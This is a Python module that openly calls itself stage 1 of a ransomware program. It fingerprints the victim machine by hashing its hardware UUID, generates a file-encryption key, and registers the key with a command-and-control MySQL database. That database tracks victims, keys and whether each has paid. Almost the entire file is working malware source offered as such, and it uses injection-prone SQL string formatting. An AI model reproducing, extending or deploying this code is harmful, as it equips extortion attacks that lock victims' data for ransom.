#!/usr/bin/env python

#=========================================================
#This Module is Written to Execute Stage1 of Ransomeware
#=========================================================
# Stage1
#	|____*****TAKES 4 Arguments, i.e. [server, username, password, db_name]*****
#   |____Generates Unique Machine ID
#   |____Generates Random Encryption Key With Fixed Lenght
#   |____Export KEY to Command & Control Server
#	|____*****RETURN : Encryption/Decryption KEY & Unique MachineID*****

import mysql.connector   #pip install mysql-connector-python
import random, base64, time, subprocess, hashlib, configparser

class Stage1:
    def __init__(self):
        parser = configparser.RawConfigParser()
        config_file = 'config.txt'
        parser.read(config_file)
                
        self.server =  parser.get('DB_CREDS', 'server')
        self.username =  parser.get('DB_CREDS', 'username')
        self.password =  parser.get('DB_CREDS', 'password')
        self.db_name =  parser.get('DB_CREDS', 'db_name')    
  
    def start(self):
        unique_machine_id = self.gen_unique_id() #Calling gen_unique_id() Function
        key = self.gen_encrypt_key_and_export(unique_machine_id)  #Generating & Exporting KEY
        return unique_machine_id, key
    
    def gen_unique_id(self):
        current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        m = hashlib.md5()
        m.update(current_machine_id.encode('UTF-8'))
        unique_md5_hash = m.hexdigest()
        return unique_md5_hash   #Machine ID
        
    def gen_encrypt_key_and_export(self, unique_machine_id):            
        # Database operations
        mydb = mysql.connector.connect(host=self.server, user=self.username, passwd=self.password, database=self.db_name) 
        mycursor = mydb.cursor()
        request = f"SELECT decrypt_key FROM nekros_keys WHERE software_key=\'{unique_machine_id}\'"
        mycursor.execute(request)
        result_request = mycursor.fetchone()
        if result_request is None:
            # Generate Key
            keygen = "".join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(16))
            m = hashlib.md5()
            m.update(keygen.encode('UTF-8'))
            encrypt_key = m.hexdigest()  
            request = "INSERT INTO nekros_keys (software_key, decrypt_key, date, payment) VALUES ('%s', '%s', '%s', '%s')" % (unique_machine_id, encrypt_key, time.strftime('%Y-%m-%d %H:%M:%S'), False)
            mycursor.execute(request)
            mydb.close()
        elif result_request is not None:
            encrypt_key = result_request[0]
            mydb.close()
        
        key = encrypt_key
        # Return key
        return key
        
if __name__ == '__main__':
    print("[*] Initiating Stage 1 ...")
    test = Stage1()
    unique_machine_id, key = test.start()
    
    print(f"[===] Machine ID : {unique_machine_id}")
    print(f"[===] KEY : {key}")
    print("[+] Stage 1 Completed Successfully...")